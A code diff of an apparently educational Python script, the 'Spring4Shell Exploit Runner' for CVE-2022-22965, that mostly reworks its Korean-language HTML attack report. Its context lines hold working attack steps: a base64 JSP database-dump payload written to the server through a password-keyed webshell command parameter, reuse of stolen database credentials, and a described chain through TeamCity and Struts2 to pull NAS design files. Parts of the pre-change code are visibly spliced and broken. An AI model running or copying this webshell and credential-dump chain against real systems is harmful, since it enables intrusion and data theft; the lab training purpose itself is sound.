@@ -103,7 +103,7 @@ def detect_spring_container(default="01testserver-spring-1"):
 def main():
     print()
     print("=" * 60)
-    print("  Spring4Shell Exploit Runner  (CVE-2022-22965)")
+    print("  [SL Cyber-Shield] Spring4Shell Exploit Runner  (CVE-2022-22965)")
     print("  Docker Local Environment  |  Educational Use Only")
     print("=" * 60)
 
@@ -355,7 +355,6 @@ def main():
     run_mode = ""
     
     if results.get("step6", False):
-        # 강사님 조언 기반 1차 시도: mysql 클라이언트 이용
         if "mysql" in found_clients and db_credentials.get('host'):
             info("Phase 3: Connecting to DB directly using the 'mysql' client via RCE...")
             run_mode = "Native MySQL Client"
@@ -376,12 +375,10 @@ def main():
                 warn("MySQL client failed to connect. Falling back to JSP injection...")
                 results["step7"] = False
                 
-        # 2차 시도: mysql 클라이언트가 없을 경우 커스텀 JSP 배포
         if not results.get("step7", False):
             info("Phase 3: DB client not available. Deploying Custom JSP JDBC payload via RCE...")
             run_mode = "Custom JSP Injection"
             
-            # Create a small JSP code that executes a query using JDBC and the extracted credentials
             jsp_code = '''<%@ page import="java.sql.*" %>
 <%
 try {
@@ -411,14 +408,12 @@ try {
             import base64
             b64_jsp = base64.b64encode(jsp_code.encode()).decode()
             
-            # Write to db_dump.jsp via health_check.jsp RCE
             write_cmd = f"echo {b64_jsp} | base64 -d > /usr/local/tomcat/webapps/spring-form/db_dump.jsp"
             write_url = f"{BASE}/health_check.jsp?pwd=glory&cmd=" + urllib.parse.quote(write_cmd)
             check_shell(write_url)
             time.sleep(1)
             
             info("Executing DB query via deployed RCE JSP payload...")
-            
             dump_url = f"{BASE}/spring-form/db_dump.jsp?u={urllib.parse.quote(db_credentials.get('url', ''))}&n={urllib.parse.quote(db_credentials.get('user', ''))}&p={urllib.parse.quote(db_credentials.get('pass', ''))}"
             
             req = urllib.request.Request(dump_url)
@@ -485,10 +480,13 @@ try {
         results["step9"] = False
 
     # ══════════════════════════════════════════════════════════
-    # 최종 결과 요약
+    # 최종 결과 요약 & 보고서 생성
     # ══════════════════════════════════════════════════════════
     header("Result Summary")
-    print()
+    
+    all_pass = all(results.values())
+    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    now = datetime.datetime.now()
 
     labels = {
         "step1": "STEP 1 | Payload Transmission",
@@ -497,59 +495,63 @@ try {
         "step4": "STEP 4 | Stage2 Deployed (curl or docker cp)",
         "step5": "STEP 5 | Stage2 (health_check.jsp) Verified",
         "step6": "STEP 6 | Info Leakage (Find DB Clients & Configs via RCE)",
-        "step7": "ST    html_content = f"""
-    <!DOCTYPE html>
-    <html lang="ko">
-    <head>
-        <meta charset="UTF-8">
-        <title>sl-cyber-shield | Automated Exploitation Report</title>
-        <style>
-            :root {{
-                --sl-dark-blue: #151C5A;
-                --sl-blue-2: #065590;
-                --sl-blue-3: #0192BF;
-            }}
-            body {{ font-family: 'Segoe UI', Arial, sans-serif; background-color: #05081a; color: #e6e6e6; margin: 0; padding: 20px; }}
-            .container {{ max-width: 1000px; margin: auto; background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(10px); padding: 40px; border-radius: 15px; border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 8px 32px rgba(0,0,0,0.8); }}
-            h1 {{ color: var(--sl-blue-3); text-align: center; border-bottom: 2px solid var(--sl-dark-blue); padding-bottom: 15px; font-weight: 700; letter-spacing: -1px; }}
-            h2 {{ color: var(--sl-blue-3); margin-top: 35px; border-bottom: 1px dashed var(--sl-dark-blue); padding-bottom: 8px; font-size: 1.4em; }}
-            .summary {{ background: rgba(21, 28, 90, 0.3); padding: 25px; border-radius: 10px; margin-bottom: 35px; border: 1px solid var(--sl-dark-blue); }}
-            .step {{ margin-bottom: 25px; padding: 20px; border-left: 6px solid #444; background: rgba(0, 0, 0, 0.2); border-radius: 0 8px 8px 0; }}
-            .step.success {{ border-left-color: var(--sl-blue-3); border-top: 1px solid rgba(1, 146, 191, 0.1); }}
-            .step.fail {{ border-left-color: #555; opacity: 0.7; }}
-            .badge-success {{ background: var(--sl-blue-3); color: white; padding: 5px 12px; border-radius: 4px; font-weight: bold; font-size: 0.85em; }}
-            .badge-fail {{ background: #555; color: white; padding: 5px 12px; border-radius: 4px; font-weight: bold; font-size: 0.85em; }}
-            pre {{ background: #000; color: #00ff41; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Monaco', monospace; margin-top: 10px; border: 1px solid #333; font-size: 12px; }}
-            .footer {{ text-align: center; margin-top: 50px; color: #555; font-size: 0.85em; border-top: 1px solid #222; padding-top: 20px; }}
-            .desc {{ color: #bbb; line-height: 1.7; margin-bottom: 20px; font-size: 1.05em; }}
-            .res-box {{ background-color: rgba(0,0,0,0.4); padding: 20px; border: 1px solid #222; border-radius: 8px; margin-top: 15px; }}
-            .cred-highlight {{ color: #f39c12; font-weight: bold; }}
-            ul.creds {{ list-style-type: none; padding-left: 0; margin-top: 15px; }}
-            ul.creds li {{ background: rgba(255, 255, 255, 0.02); margin-bottom: 8px; padding: 12px; border-left: 4px solid var(--sl-blue-3); font-family: monospace; font-size: 13px; }}
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <div style="text-align:right; font-size:12px; color:var(--sl-blue-3); font-weight:900; letter-spacing:2px; margin-bottom:10px;">SL CYBER-SHIELD | SCS-EP</div>
-            <h1>🛡️ [MAIN SCENARIO] sl-cyber-shield 침투 분석 결과 보고서 <br><span style="font-size: 0.45em; color: #555; font-weight:400;">(Generated At: {current_time})</span></h1>
-            
-            <div class="summary">
-                <h2 style="color:white; margin-top:0;">1. 시뮬레이션 개요 (Simulation Summary)</h2>
-                <p class="desc">
-                    본 보고서는 <strong>Spring4Shell(CVE-2022-22965)</strong> 제로데이 취약점을 기점으로 
-                    TeamCity 및 Struts2 취약점을 연계 공격하여 사내 핵심 자산(NAS 도면 데이터)을 탈취하는 
-                    <strong>APT(Advanced Persistent Threat)</strong> 시뮬레이션 전 과정을 기록합니다.
-                </p>
-                <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 20px; font-size:14px;">
-                    <p><strong>공격 대상 엔드포인트:</strong> <br><a style="color:var(--sl-blue-3);" href="{TARGET_URL}" target="_blank">{TARGET_URL}</a></p>
-                    <p><strong>최종 실습 판정:</strong> <br>{'<span class="badge-success" style="font-size:18px; padding:10px 20px; display:inline-block; margin-top:5px;">전체 시나리오 장악 성공</span>' if all_pass else '<span class="badge-fail">일부 과정 차단됨</span>'}</p>
-                </div>
+        "step7": "STEP 7 | Internal DB Access via RCE",
+        "step8": "STEP 8 | Lateral Movement (TeamCity & Struts2)",
+        "step9": "STEP 9 | NAS SMB Data Extraction"
+    }
+
+    html_content = f"""<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>sl-cyber-shield | Automated Exploitation Report</title>
+    <style>
+        :root {{
+            --sl-dark-blue: #151C5A;
+            --sl-blue-2: #065590;
+            --sl-blue-3: #0192BF;
+        }}
+        body {{ font-family: 'Segoe UI', Arial, sans-serif; background-color: #05081a; color: #e6e6e6; margin: 0; padding: 20px; }}
+        .container {{ max-width: 1000px; margin: auto; background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(10px); padding: 40px; border-radius: 15px; border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 8px 32px rgba(0,0,0,0.8); }}
+        h1 {{ color: var(--sl-blue-3); text-align: center; border-bottom: 2px solid var(--sl-dark-blue); padding-bottom: 15px; font-weight: 700; letter-spacing: -1px; }}
+        h2 {{ color: var(--sl-blue-3); margin-top: 35px; border-bottom: 1px dashed var(--sl-dark-blue); padding-bottom: 8px; font-size: 1.4em; }}
+        .summary {{ background: rgba(21, 28, 90, 0.3); padding: 25px; border-radius: 10px; margin-bottom: 35px; border: 1px solid var(--sl-dark-blue); }}
+        .step {{ margin-bottom: 25px; padding: 20px; border-left: 6px solid #444; background: rgba(0, 0, 0, 0.2); border-radius: 0 8px 8px 0; }}
+        .step.success {{ border-left-color: var(--sl-blue-3); border-top: 1px solid rgba(1, 146, 191, 0.1); }}
+        .step.fail {{ border-left-color: #555; opacity: 0.7; }}
+        .badge-success {{ background: var(--sl-blue-3); color: white; padding: 5px 12px; border-radius: 4px; font-weight: bold; font-size: 0.85em; }}
+        .badge-fail {{ background: #555; color: white; padding: 5px 12px; border-radius: 4px; font-weight: bold; font-size: 0.85em; }}
+        pre {{ background: #000; color: #00ff41; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Monaco', monospace; margin-top: 10px; border: 1px solid #333; font-size: 12px; }}
+        .footer {{ text-align: center; margin-top: 50px; color: #555; font-size: 0.85em; border-top: 1px solid #222; padding-top: 20px; }}
+        .desc {{ color: #bbb; line-height: 1.7; margin-bottom: 20px; font-size: 1.05em; }}
+        .res-box {{ background-color: rgba(0,0,0,0.4); padding: 20px; border: 1px solid #222; border-radius: 8px; margin-top: 15px; }}
+        .cred-highlight {{ color: #f39c12; font-weight: bold; }}
+        ul.creds {{ list-style-type: none; padding-left: 0; margin-top: 15px; }}
+        ul.creds li {{ background: rgba(255, 255, 255, 0.02); margin-bottom: 8px; padding: 12px; border-left: 4px solid var(--sl-blue-3); font-family: monospace; font-size: 13px; }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div style="text-align:right; font-size:12px; color:var(--sl-blue-3); font-weight:900; letter-spacing:2px; margin-bottom:10px;">SL CYBER-SHIELD | SCS-EP</div>
+        <h1>🛡️ [MAIN SCENARIO] sl-cyber-shield 침투 분석 결과 보고서 <br><span style="font-size: 0.45em; color: #555; font-weight:400;">(Generated At: {current_time})</span></h1>
+        
+        <div class="summary">
+            <h2 style="color:white; margin-top:0;">1. 시뮬레이션 개요 (Simulation Summary)</h2>
+            <p class="desc">
+                본 보고서는 <strong>Spring4Shell(CVE-2022-22965)</strong> 제로데이 취약점을 기점으로 
+                TeamCity 및 Struts2 취약점을 연계 공격하여 사내 핵심 자산(NAS 도면 데이터)을 탈취하는 
+                <strong>APT(Advanced Persistent Threat)</strong> 시뮬레이션 전 과정을 기록합니다.
+            </p>
+            <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 20px; font-size:14px;">
+                <p><strong>공격 대상 엔드포인트:</strong> <br><a style="color:var(--sl-blue-3);" href="{TARGET_URL}" target="_blank">{TARGET_URL}</a></p>
+                <p><strong>최종 실습 판정:</strong> <br>{'<span class="badge-success" style="font-size:18px; padding:10px 20px; display:inline-block; margin-top:5px;">전체 시나리오 장악 성공</span>' if all_pass else '<span class="badge-fail">일부 과정 차단됨</span>'}</p>
             </div>
+        </div>
 
-            <h2 style="color:white;">2. 단계별 공격 수행 상세 내역 (Detailed Attack Timeline)</h2>
-    """
+        <h2 style="color:white;">2. 단계별 공격 수행 상세 내역 (Detailed Attack Timeline)</h2>
+"""
 
-    step_descriptions = {{
+    step_descriptions = {
         "step1": "Spring Framework Data Binding 취약점을 이용한 Tomcat 로그 속성 변조 시도 및 페이로드 전송.",
         "step2": "Webshell Drop: 물리 디스크 내 yaho4.jsp 생성을 유도하는 트리거 트래픽 발생.",
         "step3": "1단계 웹쉘(Stager) 접속 상태 점검을 통해 초기 침투 성공(RCE) 여부 확인.",
@@ -559,25 +561,6 @@ try {
         "step7": "<strong>Threat Simulation (DB)</strong>: 탈취된 계정을 재사용하여 내부망 DB(Spring DB) 테이블 무단 덤프.",
         "step8": "<strong>Lateral Movement (Struts & TC)</strong>: 빌드 서버(TeamCity) 취약점 연계 및 Struts2 파일 업로드 취약점 악용을 통한 임직원 DB 탈취.",
         "step9": "<strong>Exfiltration (NAS SMB)</strong>: 분리된 사내 연구망 NAS 스토리지의 접근 권한 확보 및 제품 설계 도면 리스트 탈취."
-    }}
-#e94560;" href="{TARGET_URL}" target="_blank">{TARGET_URL}</a></p>
-                <p><strong>거점 웹쉘 주소:</strong> <a style="color:#438a5e;" href="{STAGE2_URL}" target="_blank">{STAGE2_URL}</a></p>
-                <p><strong>최종 실습 판정:</strong> {'<span class="badge-success">전체 시나리오 장악 성공</span>' if all_pass else '<span class="badge-fail">일부 과정 차단됨</span>'}</p>
-            </div>
-
-            <h2 style="color:#fff;">단계별 해킹 수행 상세 내역</h2>
-    """
-
-    step_descriptions = {
-        "step1": "Payload Transmission: Spring Framework의 Data Binding 취약점을 이용해 Tomcat 로그 기록 속성을 외부에서 변조하는 패킷을 전송했습니다.",
-        "step2": "Tomcat Log Flush: 물리 디스크에 yaho4.jsp 웹쉘이 생성되도록 유도 트래픽을 보냈습니다.",
-        "step3": "1단계 웹쉘(Stager) 접속 상태를 점검하여, 타겟 서버의 코드 실행(RCE) 권한 획득 여부를 검증했습니다.",
-        "step4": "기본 웹쉘을 거점 삼아, 향후 횡적 이동의 중추가 될 완성형 Stage2 웹쉘(health_check.jsp)을 내부 배포했습니다.",
-        "step5": "디버깅과 원활한 RCE 로직을 탑재한 완성형 웹쉘의 동작 무결성을 점검했습니다.",
-        "step6": "<strong>Info Leakage (크리덴셜 추출)</strong>: RCE를 활용하여 타겟 환경 내부에 저장된 DB URL 및 계정 정보를 탐색해 성공적으로 탈취했습니다.",
-        "step7": "<strong>Threat Demonstration (내부망 DB 타격)</strong>: 탈취한 계정을 재사용, 해커가 내부망의 Spring DB에 직접 접근시켜 고객용 테이블을 그대로 덤프했습니다.",
-        "step8": "<strong>Lateral Movement (Struts & TeamCity)</strong>: Spring 거점에서 최신 TeamCity 익스플로잇으로 관리자 권한을 강탈한 뒤, Struts2 파일 업로드 취약점을 연쇄 발동시켜 핵심 임직원 데이터베이스를 탈취했습니다.",
-        "step9": "<strong>Advanced Post-Exploitation (NAS SMB)</strong>: JCIFS-NG 어댑터를 동적으로 구성, 인트라넷 내부에 분리된 사내 연구용 NAS 스토리지의 파일 맵을 열람했습니다."
     }
 
     def _esc(s): return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
@@ -589,24 +572,18 @@ try {
         desc = step_descriptions.get(key, "")
         detail = ""
 
-        # ── Step 1~5: 수집된 원시 데이터를 항상 표시 ──
         if key in ["step1", "step2", "step3", "step4", "step5"] and key in details:
             detail = f"<div class='res-box'><pre>{_esc(details[key])}</pre></div>"
-
-        # ── Step 6: 크리덴셜 추출 결과 ──
         elif key == "step6":
             d6 = details.get("step6", {})
             creds = d6.get("credentials", {})
             clients_str = ", ".join(d6.get("clients", [])) or "없음"
             raw_props = _esc(d6.get("raw_props", "")[:600])
-            if creds.get("url"):
-                cred_html = f"""<ul class='creds'>
-                    <li>DB URL : <span style='color:#e94560'>{_esc(creds.get('url',''))}</span></li>
-                    <li>USER   : <span style='color:#e94560'>{_esc(creds.get('user',''))}</span></li>
-                    <li>PASS   : <span style='color:#e94560'>{_esc(creds.get('pass',''))}</span></li>
-                </ul>"""
-            else:
-                cred_html = "<p style='color:#e74c3c'>설정 파일에서 DB 접속 정보를 추출하지 못했습니다.</p>"
+            cred_html = f"""<ul class='creds'>
+                <li>DB URL : <span style='color:#e94560'>{_esc(creds.get('url',''))}</span></li>
+                <li>USER   : <span style='color:#e94560'>{_esc(creds.get('user',''))}</span></li>
+                <li>PASS   : <span style='color:#e94560'>{_esc(creds.get('pass',''))}</span></li>
+            </ul>""" if creds.get("url") else "<p style='color:#e74c3c'>설정 파일에서 DB 접속 정보를 추출하지 못했습니다.</p>"
             detail = f"""<div class='res-box'>
                 <p class='cred-highlight'>발견된 DB 클라이언트: {_esc(clients_str)}</p>
                 <p>설정 파일: <code style='color:#f39c12'>{_esc(d6.get('config_file',''))}</code></p>
@@ -614,8 +591,6 @@ try {
                 <p style='color:#888;margin-top:10px'>설정 파일 원문 (앞 600자):</p>
                 <pre>{raw_props}</pre>
             </div>"""
-
-        # ── Step 7: DB 덤프 결과 ──
         elif key == "step7":
             mode_label = _esc(run_mode) if run_mode else "미실행"
             dump_display = _esc(db_dump_result)[:1200] if db_dump_result else "덤프 결과 없음"
@@ -623,13 +598,9 @@ try {
                 <p class='cred-highlight'>실행 방법: {mode_label}</p>
                 <pre>{dump_display}</pre>
             </div>"""
-
-        # ── Step 8: 횡적 이동 결과 ──
         elif key == "step8":
             s8_display = _esc(step8_result)[:2000] if step8_result else "실행 결과 없음 (Step 5 미통과 또는 오류)"
             detail = f"<div class='res-box'><pre>{s8_display}</pre></div>"
-
-        # ── Step 9: NAS SMB 결과 ──
         elif key == "step9":
             s9_display = _esc(step9_result)[:2000] if step9_result else "실행 결과 없음 (Step 5 미통과 또는 오류)"
             detail = f"<div class='res-box'><pre>{s9_display}</pre></div>"
@@ -644,8 +615,8 @@ try {
 
     html_content += """
             <div class="footer">
-                <p>본 실습 결과 보고서는 APT 침투 교육 목적으로 <strong>run.py</strong> 체이닝 스크립트에 의해 자동 생성되었습니다.<br> 
-                모의해킹 실습 코드를 외부 시스템에 임의 사용하는 것은 금지됩니다.</p>
+                <p>본 실습 결과 보고서는 SL Factory Innovation Team의 공정 보안 고도화를 위한 위협 모델링 결과물입니다.<br> 
+                SCS-EP(Cyber-Shield) 엔진에 의해 자동 생성되었으며, 무단 복제 및 상용 목적 사용을 금합니다.</p>
             </div>
         </div>
     </body>
@@ -660,16 +631,8 @@ try {
         with open(report_path, "w", encoding="utf-8") as rf:
             rf.write(html_content)
         print(f"  [📄 HTML 보고서 생성] 03.FinalReport/{report_filename} 파일을 열어보세요!")
-    except PermissionError:
-        import tempfile, shutil
-        tmp_path = os.path.join(tempfile.gettempdir(), report_filename)
-        with open(tmp_path, 'w', encoding='utf-8') as tf:
-            tf.write(html_content)
-        try:
-            shutil.move(tmp_path, report_path)
-            print(f"  [📄 HTML 보고서 생성] 03.FinalReport/{report_filename} 파일을 열어보세요!")
-        except Exception as e:
-            print(f"  [WARNING] 권한 문제로 03.FinalReport에 저장 불가. 임시 경로: {tmp_path} ({e})")
+    except Exception as e:
+        print(f"  [WARNING] 보고서 생성 실패: {e}")
 
     print()
 
